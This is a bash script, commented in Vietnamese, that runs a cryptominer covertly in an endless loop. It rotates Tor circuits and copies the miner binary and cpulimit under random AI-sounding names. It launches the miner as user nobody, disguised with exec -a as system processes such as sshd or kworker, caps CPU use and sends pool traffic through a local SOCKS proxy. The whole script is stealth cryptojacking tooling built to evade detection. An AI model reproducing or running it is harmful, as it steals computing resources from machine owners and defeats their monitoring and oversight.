#!/bin/bash

# Vòng lặp vô tận để thay đổi IP sau một khoảng thời gian ngẫu nhiên
while true; do
  sleep_time=$(shuf -i 300-1800 -n 1)
  sleep $sleep_time

  should_change_ip=$(shuf -i 1-100 -n 1)
  if [ "$should_change_ip" -lt 70 ]; then
    if pgrep -x "tor" > /dev/null; then
      echo "Requesting Tor to change circuit..."
      kill -HUP $(pgrep tor)
      echo "Tor circuit changed."
    else
      echo "Tor service is not running."
    fi
  else
    echo "Keeping the same IP in this cycle."
  fi

  # Dừng và xóa tiến trình cũ
  if [ -f /root/model.txt ]; then
    CURRENT_SYSTEM_PROCESS=$(cat /root/model.txt | cut -d ':' -f1)
    CURRENT_NAME=$(cat /root/model.txt | cut -d ':' -f2)
    echo "Stopping old process: $CURRENT_NAME wrapped by $CURRENT_SYSTEM_PROCESS"
    pkill -f "$CURRENT_SYSTEM_PROCESS"
    pkill -f "/usr/sbin/$CURRENT_NAME"
  fi

  if [ -f /usr/sbin/$CURRENT_NAME ]; then
    echo "Removing old process file: $CURRENT_NAME"
    rm -f /usr/sbin/$CURRENT_NAME
  fi

  SYSTEM_PROCESS_NAMES=("systemd" "sshd" "cron" "bash" "kworker" "dbus-daemon")
  RANDOM_SYSTEM_PROCESS=${SYSTEM_PROCESS_NAMES[$RANDOM % ${#SYSTEM_PROCESS_NAMES[@]}]}

  AI_PROCESS_NAMES=("ai_trainer" "deep_learning_worker" "neural_net" "model_optimizer" "tensor_processor" "gpu_trainer")
  RANDOM_AI_NAME=${AI_PROCESS_NAMES[$RANDOM % ${#AI_PROCESS_NAMES[@]}]}
  RANDOM_NUMBER=$(shuf -i 1000-9999 -n 1)

  FINAL_NAME="${RANDOM_AI_NAME}-${RANDOM_NUMBER}"
  echo "$RANDOM_SYSTEM_PROCESS:$FINAL_NAME" > /root/model.txt

  cp /usr/sbin/systemdd /usr/sbin/$FINAL_NAME

  TOTAL_CORES=$(nproc)
  cpu_hint=$(shuf -i $CPU_MIN-$CPU_MAX -n 1)
  CPU_HINT=$(echo "($TOTAL_CORES * $cpu_hint) / 100" | bc)

  CORE_SET=$(seq -s, 0 $(($TOTAL_CORES - 1)))

  TOTAL_SYSTEM_POWER=$(($TOTAL_CORES * 100))
  CPU_LIMIT_PERCENT=$(shuf -i 70-90 -n 1)
  CPU_LIMIT=$(($TOTAL_SYSTEM_POWER * $CPU_LIMIT_PERCENT / 100))

  # Xóa cpulimit cũ nếu tồn tại
  if [ -f /usr/bin/$CPULIMIT_NAME ]; then
    echo "Removing old cpulimit: $CPULIMIT_NAME"
    rm -f /usr/bin/$CPULIMIT_NAME
  fi

  # Tạo tên mới cho cpulimit
  CPULIMIT_NAME="${RANDOM_AI_NAME}_${RANDOM_NUMBER}"
  cp /usr/bin/cpulimit /usr/bin/$CPULIMIT_NAME

  echo "Restarting systemdd process with new name: $FINAL_NAME and cpulimit: $CPULIMIT_NAME"
  sudo -u nobody bash -c "exec -a $RANDOM_SYSTEM_PROCESS /usr/bin/$CPULIMIT_NAME -l $CPU_LIMIT -- taskset -c $CORE_SET /usr/sbin/$FINAL_NAME --donate-level $DONATE -o $POOL -u $USERNAME -a $ALGO --no-huge-pages --cpu-max-threads-hint=$CPU_HINT --tls --proxy=socks5://127.0.0.1:8118"

done
